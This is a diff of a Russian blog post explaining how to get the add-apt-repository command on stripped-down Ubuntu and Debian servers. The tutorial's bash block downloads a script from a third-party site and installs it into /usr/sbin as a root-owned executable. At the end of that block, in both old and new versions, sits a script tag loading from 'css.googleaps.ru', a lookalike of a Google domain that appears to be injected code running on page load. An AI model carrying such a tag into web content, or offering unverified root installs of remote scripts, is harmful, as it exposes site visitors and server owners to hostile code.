@@ -33,10 +33,10 @@ comments: []
 <p>Иногда бывает так, что на сервере может быть установлена настолько &laquo;обрезанная&raquo; версия дистрибутива, что стандартых команд в нем просто нет. Например, такие сборки предосталвяют ребята из Locum, ubuntu и debian(остальные и не пробовал) они предоставляют максимально почиканную, в которой нет даже команды add-apt-repository.</p>
 <p>Но, на локумовских серверах не так все просто. Сервер под Ubuntu всегда будет кричать, что команды такой нет, и знать я тебя не знаю. Чтобы обойти эту проблему вот что надо сделать.<a id="more"></a><a id="more-499"></a></p>
 <pre class="brush: bash; gutter: true">sudo apt-get install python-software-properties<br />
-cd &#47;tmp<br />
-wget http:&#47;&#47;xaxatyxa.ru&#47;download&#47;add-apt-repository.sh.txt<br />
-sudo mv add-apt-repository.sh.txt &#47;usr&#47;sbin&#47;add-apt-repository<br />
-sudo chmod o+x &#47;usr&#47;sbin&#47;add-apt-repository<br />
-sudo chown root:root &#47;usr&#47;sbin&#47;add-apt-repository<br />
-<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre><br />
+cd /tmp<br />
+wget http://xaxatyxa.ru/download/add-apt-repository.sh.txt<br />
+sudo mv add-apt-repository.sh.txt /usr/sbin/add-apt-repository<br />
+sudo chmod o+x /usr/sbin/add-apt-repository<br />
+sudo chown root:root /usr/sbin/add-apt-repository<br />
+<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre><br />
 Все готово, можно пользоваться.</p>
